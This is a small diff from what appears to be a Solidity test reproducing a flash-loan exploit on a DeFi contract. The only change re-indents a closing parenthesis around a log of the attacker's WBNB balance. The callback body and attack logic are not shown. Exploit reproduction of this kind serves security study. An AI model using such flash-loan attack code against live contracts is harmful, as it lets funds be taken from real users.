@@ -52,7 +52,7 @@ contract ContractTest is Test {
         oracle.flashLoan(600 * 1e18, 0, address(this), new bytes(1));
         emit log_named_decimal_uint(
             "[End] Attacker WBNB balance after exploit", WBNB.balanceOf(address(this)), WBNB.decimals()
-            );
+        );
     }
 
     function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
